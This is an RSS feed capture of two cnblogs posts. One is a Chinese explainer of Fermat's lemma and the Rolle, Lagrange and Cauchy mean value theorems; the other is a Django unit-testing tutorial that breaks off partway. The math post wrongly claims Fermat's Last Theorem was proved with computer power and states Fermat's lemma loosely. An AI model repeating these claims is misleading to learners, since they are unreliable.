<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>高等数学——讲透微分中值定理 - TechFlow2019</title>
<link>http://www.cnblogs.com/techflow/p/12340116.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/techflow/p/12340116.html</guid>
<description>&lt;p&gt;本文始发于个人公众号：&lt;strong&gt;TechFlow&lt;/strong&gt;，原创不易，求个关注&lt;/p&gt;

&lt;p&gt;今天和大家回顾一下高数当中的微分中值定理，据说是很多高数公式的基础。由于本人才疏学浅，所以对于这点没有太深的认识。但是提出中值定理的几个数学家倒是如雷贯耳，前段时间抽空研究了一下，发现很有意思，完全没有想象中那么枯燥。所以今天的文章和大家聊聊这个话题，我会跳过一些无关紧要或者意义不大的证明部分，尽量讲得浅显有趣一些。&lt;/p&gt;

&lt;h2 id=&quot;费马引理&quot;&gt;费马引理&lt;/h2&gt;

&lt;p&gt;首先上场的是费马引理，它是我们介绍后面罗尔中值定理的前提。这个费马引理非常简单，不需要太多篇幅。所以在介绍它之前，先来讲讲费马这个人。&lt;/p&gt;
&lt;p&gt;费马在数学届大名鼎鼎，他最著名的理论是费马大小定理。定理的内容我不讲了，和这篇文章也没啥关系。但是这背后有一段著名的故事，说是费马在提出费马大定理的时候并没有觉得它有多么出彩，因此没有加以详细的证明。有一天他在翻阅自己笔记本的时候突然灵感迸发想出了一个绝妙的证明方法。但是由于笔记本旁边空白的区域太小，所以费马这人就在书页边写了一句话，他说：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;我已发现一种绝妙的证明方法，可惜这里空间太小，写不下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;没想到费马不当回事的定理在日后的数学界非常重要，出人意料的是无数数学家尝试证明费马大定理的正确性，但是都没有成功。虽然这个定理广泛使用，大家也都觉得应该是正确的，但是就是没有人能证明。这一度也称为数学界的顶级难题，一直到1995年，据说也是靠着计算机提供了算力支撑，才终于得以证明。&lt;/p&gt;
&lt;p&gt;关于费马在书页边写的绝妙解法，数学界也争论不休。有些人扼腕叹息，觉得是数学界一大损失。还有人觉得这不太靠谱，这可能不是灵感，而是错觉。但无论如何，这也成就了费马，也许他不是史上数学最强的人，但一定是”装逼“最成功的的一个。&lt;/p&gt;
&lt;p&gt;我们来看下来自费马的凝视。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/2/21/170651dfc0358579?w=199&amp;amp;h=254&amp;amp;f=png&amp;amp;s=126016&quot;/&gt;&lt;/p&gt;
&lt;p&gt;言归正传，我们来看下费马引理。费马引理很简单，是说如果在一段曲线当中存在一个点&lt;span class=&quot;math inline&quot;&gt;\(x_0\)&lt;/span&gt;，使得在&lt;span class=&quot;math inline&quot;&gt;\(x_0\)&lt;/span&gt;的邻域内都存在&lt;span class=&quot;math inline&quot;&gt;\(f(x) \leq f(x_0)\)&lt;/span&gt;（或&lt;span class=&quot;math inline&quot;&gt;\(f(x) \geq f(x_0)\)&lt;/span&gt;），那么就说明&lt;span class=&quot;math inline&quot;&gt;\(f'(x_0)=0\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;对导数熟悉的同学会发现，这其实就是把话倒着说。导数为0的点是极值点，既然是极值点显然附近的点要么都大于它或者都小于它。我们看下下图就可以想明白。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/2/21/170651dfc190072e?w=245&amp;amp;h=187&amp;amp;f=png&amp;amp;s=38490&quot;/&gt;&lt;/p&gt;
&lt;p&gt;证明的过程非常简单，我们令&lt;span class=&quot;math inline&quot;&gt;\(\Delta x \to 0\)&lt;/span&gt;，那么显然&lt;span class=&quot;math inline&quot;&gt;\(f(x + \Delta x) \geq f(x_0), f(x - \Delta x) \leq f(x_0)\)&lt;/span&gt;，利用极限左右边界相等，我们就可以证明它的正确性。&lt;/p&gt;

&lt;h2 id=&quot;罗尔中值定理&quot;&gt;罗尔中值定理&lt;/h2&gt;

&lt;p&gt;罗尔中值定理是在费马引理的基础上做了一点引申，我们还是看上图，在上图当中A和B两点的函数值相等。所以罗尔中值定理是，如果某个函数满足：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;在闭区间[a, b]上连续&lt;/li&gt;
&lt;li&gt;f(a) = f(b)&lt;/li&gt;
&lt;li&gt;在开区间(a, b)上可导&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;那么，在区间(a, b)当中必然存在一个点&lt;span class=&quot;math inline&quot;&gt;\(x_0\)&lt;/span&gt;，使得&lt;span class=&quot;math inline&quot;&gt;\(f'(x_0)=0\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;这个中值定理也很容易想明白，既然函数在两个端点处值相等，那么无论它是先减再增还是先增再减或者是不增不减，那么显然都会存在至少一个极值点，既然存在极值点，那么根据费马引理显然就有导数为0的点。&lt;/p&gt;

&lt;h2 id=&quot;拉格朗日中值定理&quot;&gt;拉格朗日中值定理&lt;/h2&gt;

&lt;p&gt;罗尔定理简单易懂，但是有一个小问题就是限制条件太死，函数上不一定能找到两个点相等。针对这个问题，大佬拉格朗日对这个公式进行了拓展。&lt;/p&gt;
&lt;p&gt;他说，只要函数&lt;span class=&quot;math inline&quot;&gt;\(f(x)\)&lt;/span&gt;满足：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;在闭区间[a, b]连续&lt;/li&gt;
&lt;li&gt;在开区间(a, b)可导&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;那么就可以找到一个点&lt;span class=&quot;math inline&quot;&gt;\(\xi \in (a, b)\)&lt;/span&gt;使得：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[f(b) - f(a) = f'(\xi)(b - a)\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这个式子这样看起来非常恐怖，我们做一个变形：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[f'(\xi) = \frac{f(b) - f(a)}{b - a}\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(\frac{f(b) - f(a)}{b - a}\)&lt;/span&gt;这个我们都非常熟悉，就是就是a和b两点连线的斜率。而&lt;span class=&quot;math inline&quot;&gt;\(f'(\xi)\)&lt;/span&gt;则是函数在&lt;span class=&quot;math inline&quot;&gt;\(\xi\)&lt;/span&gt;这点的切线，从几何角度上来看，说明存在一个点的切线和端点连线平行，我们可以对照下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/2/21/170651dfdbff6ed8?w=286&amp;amp;h=176&amp;amp;f=png&amp;amp;s=30809&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从定理上来看，如果a和b点的函数值相等，这个式子和罗尔定理完全一样，也就是说罗尔定理是拉格朗日中值定理的特殊情况。我们在证明罗尔定理的时候用到了费马引理，那么证明拉格朗日中值定理的时候能不能用上罗尔定理呢？&lt;/p&gt;
&lt;p&gt;如果能用上当然很好，但是直接用是不行的，我们不能保证函数在a和b两点处值相等。为了解决这个问题，需要引入一个辅助函数，和我们做几何题的时候引入辅助线很像。老实讲这个辅助函数是怎么来的我一无所知，书本上也没有记载。我们能确信的是它管用，它是正确的，但是它是怎么来的，我们不清楚，也许是数学家的灵光一闪或者是天赋吧。&lt;/p&gt;
&lt;p&gt;以前在学奥数的时候经常遇到这种情况，一个看起来巨复杂的式子，数学天才稍稍变形或者是引入一个辅助函数或者是定理，三下五除二就解决了。这当中每一步都看得懂，也能理解，但是就是不明白他是怎么想到的，这个辅助函数就很典型。&lt;/p&gt;
&lt;p&gt;废话不多说，我们来看这个函数：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[L(x) = f(x) - f(a) - \frac{f(b) - f(a)}{b - a}(x - a)\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这个函数看起来很奇怪，但是它有一个巨牛的性质，就是它在a和b两点的值相等并且等于0，到这里就很简单了，我们对这个巨牛的函数求导：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[L'(x) = f'(x) - \frac{f(b) - f(a)}{b - a}\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;根据罗尔定理，我们可以找到一个点&lt;span class=&quot;math inline&quot;&gt;\(\xi \in (a, b)\)&lt;/span&gt;使得：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[f'(\xi) - \frac{f(b)-f(a)}{b-a}=0\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以就得证了，花里胡哨，叹为观止。但是到这里还没有结束，还有一个重头戏没有上场。&lt;/p&gt;

&lt;h2 id=&quot;柯西中值定理&quot;&gt;柯西中值定理&lt;/h2&gt;

&lt;p&gt;柯西中值定理的图像和拉格朗日的一模一样，但是含义加深了一层。在我们之前的讨论当中，我们画的是y随着x变化的函数曲线。但是有可能X轴本身也是一个函数。也就是说之前我们画的是&lt;span class=&quot;math inline&quot;&gt;\(y = f(x)\)&lt;/span&gt;的图像，现在可能变成了&lt;span class=&quot;math inline&quot;&gt;\(Y = f(x), X = F(x)\)&lt;/span&gt;的图像，换句话说X轴和Y轴都是x的因变量，这里的小写的x成了一个参数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/2/21/170651dffd103611?w=286&amp;amp;h=176&amp;amp;f=png&amp;amp;s=30809&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在这样的函数当中，某一点的切线的斜率成了: &lt;span class=&quot;math inline&quot;&gt;\(\frac{dY}{dX}=\frac{f'(x)}{F'(x)}\)&lt;/span&gt;。柯西中值定理正是作用于这样的函数上，如果函数&lt;span class=&quot;math inline&quot;&gt;\(f, F\)&lt;/span&gt;满足：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;在闭区间[a, b]上连续&lt;/li&gt;
&lt;li&gt;在开区间(a, b)上可导&lt;/li&gt;
&lt;li&gt;对于任意&lt;span class=&quot;math inline&quot;&gt;\(x \in (a, b), F'(x) \neq 0\)&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;那么至少在(a, b)当中存在一点&lt;span class=&quot;math inline&quot;&gt;\(\xi\)&lt;/span&gt;，满足：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[\frac{f(b) - f(a)}{F(b) - F(a)}=\frac{f'(\xi)}{F'(\xi)}\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;虽然这个公式看起来非常虎，但是证明方法和上面大同小异，我们引入一个基本上一样的辅助函数：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;\[L(x) = f(x) - f(a)-\frac{f(b) - f(a)}{F(b) - F(a)}[F(x) - F(b)]\]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;证明方法也是一样，可以发现这个辅助函数是满足罗尔定理的，那么我们对它求导，一模一样的方法就可以得到证明。我这里就不证了，意思不大。&lt;/p&gt;
&lt;p&gt;如果我们整理一下上面几个中值定理，会发现这是一个俄罗斯套娃，层层嵌套，但是它们研究的都是同样一件事情。这些定理会在以后微积分的章节派上用场，现在让我们先有个印象即可。&lt;/p&gt;
&lt;p&gt;今天的文章就是这些，如果觉得有所收获，请顺手扫码点个关注吧，你们的举手之劳对我来说很重要。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/2/21/17065264d341735a?w=258&amp;amp;h=258&amp;amp;f=png&amp;amp;s=23988&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 21 Feb 2020 00:31:00 +0000</pubDate>
<dc:creator>TechFlow2019</dc:creator>
<og:description>本文始发于个人公众号： TechFlow ，原创不易，求个关注 今天和大家回顾一下高数当中的微分中值定理，据说是很多高数公式的基础。由于本人才疏学浅，所以对于这点没有太深的认识。但是提出中值定理的几个</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/techflow/p/12340116.html</dc:identifier>
</item>
<item>
<title>编写 Django 应用单元测试 - 削微寒</title>
<link>http://www.cnblogs.com/xueweihan/p/12336462.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xueweihan/p/12336462.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/759200/202002/759200-20200213202051843-983322874.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://www.zmrenwu.com&quot;&gt;HelloGitHub-追梦人物&lt;/a&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;3.4666666666667&quot;&gt;
&lt;p&gt;文中所涉及的示例代码，已同步更新到 &lt;a href=&quot;https://github.com/HelloGitHub-Team/HelloDjango-blog-tutorial&quot;&gt;HelloGitHub-Team 仓库&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们博客功能越来越来完善了，但这也带来了一个问题，我们不敢轻易地修改已有功能的代码了！&lt;/p&gt;
&lt;p&gt;我们怎么知道代码修改后带来了预期的效果？万一改错了，不仅新功能没有用，原来已有的功能都可能被破坏。此前我们开发一个新的功能，都是手工运行开发服务器去验证，不仅费时，而且极有可能验证不充分。&lt;/p&gt;
&lt;p&gt;如何不用每次开发了新的功能或者修改了已有代码都得去人工验证呢？解决方案就是编写自动化测试，将人工验证的逻辑编写成脚本，每次新增或修改代码后运行一遍测试脚本，脚本自动帮我们完成全部测试工作。&lt;/p&gt;
&lt;p&gt;接下来我们将进行两种类型的测试，一种是单元测试，一种是集成测试。&lt;/p&gt;
&lt;p&gt;单元测试是一种比较底层的测试，它将一个功能逻辑的代码块视为一个单元（例如一个函数、方法、或者一个 if 语句块等，单元应该尽可能小，这样测试就会更加充分），程序员编写测试代码去测试这个单元，确保这个单元的逻辑代码按照预期的方式执行了。通常来说我们一般将一个函数或者方法视为一个单元，对其进行测试。&lt;/p&gt;
&lt;p&gt;集成测试则是一种更加高层的测试，它站在系统角度，测试由各个已经经过充分的单元测试的模块组成的系统，其功能是否符合预期。&lt;/p&gt;
&lt;p&gt;我们首先来进行单元测试，确保各个单元的逻辑都没问题后，然后进行集成测试，测试整个博客系统的可用性。&lt;/p&gt;
&lt;p&gt;Python 一般使用标准库 unittest 提供单元测试，django 拓展了单元测试，提供了一系列类，用于不同的测试场合。其中最常用到的就是 &lt;code&gt;django.test.TestCase&lt;/code&gt; 类，这个类和 Python 标准库的 &lt;code&gt;unittest.TestCase&lt;/code&gt; 类似，只是拓展了以下功能：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;提供了一个 client 属性，这个 client 是 Client 的实例。可以把 Client 看做一个发起 HTTP 请求的功能库（类似于 requests），这样我们可以方便地使用这个类测试视图函数。&lt;/li&gt;
&lt;li&gt;运行测试前自动创建数据库，测试运行完毕后自动销毁数据库。我们肯定不希望自动生成的测试数据影响到真实的数据。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;博客应用的单元测试，主要就是和这个类打交道。&lt;/p&gt;
&lt;p&gt;django 应用的单元测试包括：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;测试 model，model 的方法是否返回了预期的数据，对数据库的操作是否正确。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;测试表单，数据验证逻辑是否符合预期&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;测试视图，针对特定类型的请求，是否返回了预期的响应&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;其它的一些辅助方法或者类等&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;接下来我们就逐一地来测试上述内容。&lt;/p&gt;
&lt;h2 id=&quot;搭建测试环境&quot;&gt;搭建测试环境&lt;/h2&gt;
&lt;p&gt;测试写在 tests.py 里（应用创建时就会自动创建这个文件），首先来个冒烟测试，用于验证测试功能是否正常，在 blog\tests.py 文件写入如下代码：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;from django.test import TestCase


class SmokeTestCase(TestCase):
    def test_smoke(self):
        self.assertEqual(1 + 1, 2)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用 manage.py 的 test 命令将自动发现 django 应用下的 tests 文件或者模块，并且自动执行以 test_ 开头的方法。运行：&lt;code&gt;pipenv run python manage.py test&lt;/code&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Creating test database for alias 'default'...&lt;br/&gt;System check identified no issues (0 silenced).&lt;/p&gt;
&lt;p&gt;.&lt;/p&gt;
&lt;p&gt;-------------------------------------------------------&lt;/p&gt;
&lt;p&gt;Ran 1 test in 0.002s&lt;/p&gt;
&lt;p&gt;OK&lt;br/&gt;Destroying test database for alias 'default'...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;OK 表明我们的测试运行成功。&lt;/p&gt;
&lt;p&gt;不过，如果需要测试的代码比较多，把全部测试逻辑一股脑塞入 tests.py，这个模块就会变得十分臃肿，不利于维护，所以我们把 tests.py 文件升级为一个包，不同的单元测试写到包下对应的模块中，这样便于模块化地维护和管理。&lt;/p&gt;
&lt;p&gt;删除 blog\tests.py 文件，然后在 blog 应用下创建一个 tests 包，再创建各个单元测试模块：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;blog\
    tests\
        __init__.py
        test_smoke.py
        test_models.py
        test_views.py
        test_templatetags.py
        test_utils.py&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;test_models.py 存放和模型有关的单元测试&lt;/li&gt;
&lt;li&gt;test_views.py 测试视图函数&lt;/li&gt;
&lt;li&gt;test_templatetags.py 测试自定义的模板标签&lt;/li&gt;
&lt;li&gt;test_utils.py 测试一些辅助方法和类等&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;p&gt;tests 包中的各个模块必须以 test_ 开头，否则 django 无法发现这些测试文件的存在，从而不会运行里面的测试用例。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;测试模型&quot;&gt;测试模型&lt;/h2&gt;
&lt;p&gt;模型需要测试的不多，因为基本上都是使用了 django 基类 models.Model 的特性，自己的逻辑很少。拿最为复杂的 Post 模型举例，它包括的逻辑功能主要有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;__str__&lt;/code&gt; 方法返回 title 用于模型实例的字符表示&lt;/li&gt;
&lt;li&gt;&lt;code&gt;save&lt;/code&gt; 方法中设置文章创建时间（created_time）和摘要（exerpt)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;get_absolute_url&lt;/code&gt; 返回文章详情视图对应的 url 路径&lt;/li&gt;
&lt;li&gt;&lt;code&gt;increase_views&lt;/code&gt; 将 views 字段的值 +1&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;单元测试就是要测试这些方法执行后的确返回了上面预期的结果，我们在 test_models.py 中新增一个类，叫做 PostModelTestCase，在这个类中编写上述单元测试的用例。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;from django.apps import apps

class PostModelTestCase(TestCase):
    def setUp(self):
        # 断开 haystack 的 signal，测试生成的文章无需生成索引
        apps.get_app_config('haystack').signal_processor.teardown()
        user = User.objects.create_superuser(
            username='admin', 
            email='admin@hellogithub.com', 
            password='admin')
        cate = Category.objects.create(name='测试')
        self.post = Post.objects.create(
            title='测试标题',
            body='测试内容',
            category=cate,
            author=user,
        )

    def test_str_representation(self):
        self.assertEqual(self.post.__str__(), self.post.title)

    def test_auto_populate_modified_time(self):
        self.assertIsNotNone(self.post.modified_time)

        old_post_modified_time = self.post.modified_time
        self.post.body = '新的测试内容'
        self.post.save()
        self.post.refresh_from_db()
        self.assertTrue(self.post.modified_time &amp;gt; old_post_modified_time)

    def test_auto_populate_excerpt(self):
        self.assertIsNotNone(self.post.excerpt)
        self.assertTrue(0 &amp;lt; len(self.post.excerpt) &amp;lt;= 54)

    def test_get_absolute_url(self):
        expected_url = reverse('blog:detail', kwargs={'pk': self.post.pk})
        self.assertEqual(self.post.get_absolute_url(), expected_url)

    def test_increase_views(self):
        self.post.increase_views()
        self.post.refresh_from_db()
        self.assertEqual(self.post.views, 1)

        self.post.increase_views()
        self.post.refresh_from_db()
        self.assertEqual(self.post.views, 2)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里代码虽然比较多，但做的事情很明确。&lt;code&gt;setUp&lt;/code&gt; 方法会在每一个测试案例运行前执行，这里做的事情是在数据库中创建一篇文章，用于测试。&lt;/p&gt;
&lt;p&gt;接下来的各个 test_* 方法就是对于各个功能单元的测试，以 &lt;code&gt;test_auto_populate_modified_time&lt;/code&gt; 为例，这里我们要测试文章保存到数据库后，&lt;code&gt;modifited_time&lt;/code&gt; 被正确设置了值（期待的值应该是文章保存时的时间）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;self.assertIsNotNone(self.post.modified_time)&lt;/code&gt; 断言文章的 modified_time 不为空，说明的确设置了值。TestCase 类提供了系列 assert* 方法用于断言测试单元的逻辑结果是否和预期相符，一般从方法的命名中就可以读出其功能，比如这里 assertIsNotNone 就是断言被测试的变量值不为 None。&lt;/p&gt;
&lt;p&gt;接着我们尝试通过&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;self.post.body = '新的测试内容'
self.post.save()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改文章内容，并重新保存数据库。预期的结果应该是，文章保存后，&lt;code&gt;modifited_time&lt;/code&gt; 的值也被更新为修改文章时的时间，接下来的代码就是对这个预期结果的断言：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;self.post.refresh_from_db()
self.assertTrue(self.post.modified_time &amp;gt; old_post_modified_time)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个 &lt;code&gt;refresh_from_db&lt;/code&gt; 方法将刷新对象 &lt;code&gt;self.post&lt;/code&gt; 的值为数据库中的最新值，然后我们断言数据库中 &lt;code&gt;modified_time&lt;/code&gt; 记录的最新时间比原来的时间晚，如果断言通过，说明我们更新文章后，&lt;code&gt;modified_time&lt;/code&gt; 的值也进行了相应更新来记录修改时间，结果符合预期，测试通过。&lt;/p&gt;
&lt;p&gt;其它的测试方法都是做着类似的事情，这里不再一一讲解，请自行看代码分析。&lt;/p&gt;
&lt;h2 id=&quot;测试视图&quot;&gt;测试视图&lt;/h2&gt;
&lt;p&gt;视图函数测试的基本思路是，向某个视图对应的 URL 发起请求，视图函数被调用并返回预期的响应，包括正确的 HTTP 响应码和 HTML 内容。&lt;/p&gt;
&lt;p&gt;我们的博客应用包括以下类型的视图需要进行测试：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首页视图 &lt;code&gt;IndexView&lt;/code&gt;，访问它将返回全部文章列表。&lt;/li&gt;
&lt;li&gt;标签视图，访问它将返回某个标签下的文章列表。如果访问的标签不存在，返回 404 响应。&lt;/li&gt;
&lt;li&gt;分类视图，访问它将返回某个分类下的文章列表。如果访问的分类不存在，返回 404 响应。&lt;/li&gt;
&lt;li&gt;归档视图，访问它将返回某个月份下的全部文章列表。&lt;/li&gt;
&lt;li&gt;详情视图，访问它将返回某篇文章的详情，如果访问的文章不存在，返回 404。&lt;/li&gt;
&lt;li&gt;自定义的 admin，添加文章后自动填充 &lt;code&gt;author&lt;/code&gt; 字段的值。&lt;/li&gt;
&lt;li&gt;RSS，返回全部文章的 RSS 内容。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;首页视图、标签视图、分类视图、归档视图都是同一类型的视图，他们预期的行为应该是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;返回正确的响应码，成功返回200，不存在则返回404。&lt;/li&gt;
&lt;li&gt;没有文章时正确地提示暂无文章。&lt;/li&gt;
&lt;li&gt;渲染了正确的 html 模板。&lt;/li&gt;
&lt;li&gt;包含关键的模板变量，例如文章列表，分页变量等。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我们首先来测试这几个视图。为了给测试用例生成合适的数据，我们首先定义一个基类，预先定义好博客的数据内容，其它视图函数测试用例继承这个基类，就不需要每次测试时都创建数据了。我们创建的测试数据如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;分类一、分类二&lt;/li&gt;
&lt;li&gt;标签一、标签二&lt;/li&gt;
&lt;li&gt;文章一，属于分类一和标签一，文章二，属于分类二，没有标签&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class BlogDataTestCase(TestCase):
    def setUp(self):
        apps.get_app_config('haystack').signal_processor.teardown()

        # User
        self.user = User.objects.create_superuser(
            username='admin',
            email='admin@hellogithub.com',
            password='admin'
        )

        # 分类
        self.cate1 = Category.objects.create(name='测试分类一')
        self.cate2 = Category.objects.create(name='测试分类二')

        # 标签
        self.tag1 = Tag.objects.create(name='测试标签一')
        self.tag2 = Tag.objects.create(name='测试标签二')

        # 文章
        self.post1 = Post.objects.create(
            title='测试标题一',
            body='测试内容一',
            category=self.cate1,
            author=self.user,
        )
        self.post1.tags.add(self.tag1)
        self.post1.save()

        self.post2 = Post.objects.create(
            title='测试标题二',
            body='测试内容二',
            category=self.cate2,
            author=self.user,
            created_time=timezone.now() - timedelta(days=100)
        )&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以 &lt;code&gt;CategoryViewTestCase&lt;/code&gt; 为例：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;class CategoryViewTestCase(BlogDataTestCase):
    def setUp(self):
        super().setUp()
        self.url = reverse('blog:category', kwargs={'pk': self.cate1.pk})
        self.url2 = reverse('blog:category', kwargs={'pk': self.cate2.pk})

    def test_visit_a_nonexistent_category(self):
        url = reverse('blog:category', kwargs={'pk': 100})
        response = self.client.get(url)
        self.assertEqual(response.status_code, 404)

    def test_without_any_post(self):
        Post.objects.all().delete()
        response = self.client.get(self.url2)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('blog/index.html')
        self.assertContains(response, '暂时还没有发布的文章！')

    def test_with_posts(self):
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed('blog/index.html')
        self.assertContains(response, self.post1.title)
        self.assertIn('post_list', response.context)
        self.assertIn('is_paginated', response.context)
        self.assertIn('page_obj', response.context)
        self.assertEqual(response.context['post_list'].count(), 1)
        expected_qs = self.cate1.post_set.all().order_by('-created_time')
        self.assertQuerysetEqual(response.context['post_list'], [repr(p) for p in expected_qs])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个类首先继承自 &lt;code&gt;BlogDataTestCase&lt;/code&gt;，&lt;code&gt;setUp&lt;/code&gt; 方法别忘了调用父类的 &lt;code&gt;stepUp&lt;/code&gt; 方法，以便在每个测试案例运行时，设置好博客测试数据。&lt;/p&gt;
&lt;p&gt;然后就是进行了3个案例测试：&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;访问一个不存在的分类，预期返回 404 响应码。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;没有文章的分类，返回200，但提示暂时还没有发布的文章！渲染的模板为 index.html&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;访问的分类有文章，则响应中应该包含系列关键的模板变量，&lt;code&gt;post_list&lt;/code&gt;、&lt;code&gt;is_paginated&lt;/code&gt;、&lt;code&gt;page_obj&lt;/code&gt;，&lt;code&gt;post_list&lt;/code&gt; 文章数量为1，因为我们的测试数据中这个分类下只有一篇文章，&lt;code&gt;post_list&lt;/code&gt; 是一个 &lt;code&gt;queryset&lt;/code&gt;，预期是该分类下的全部文章，时间倒序排序。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其它的 &lt;code&gt;TagViewTestCase&lt;/code&gt; 等测试类似，请自行参照代码分析。&lt;/p&gt;
&lt;p&gt;博客文章详情视图的逻辑更加复杂一点，所以测试用例也更多，主要需要测试的点有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;访问不存在文章，返回404。&lt;/li&gt;
&lt;li&gt;文章每被访问一次，访问量 views 加一。&lt;/li&gt;
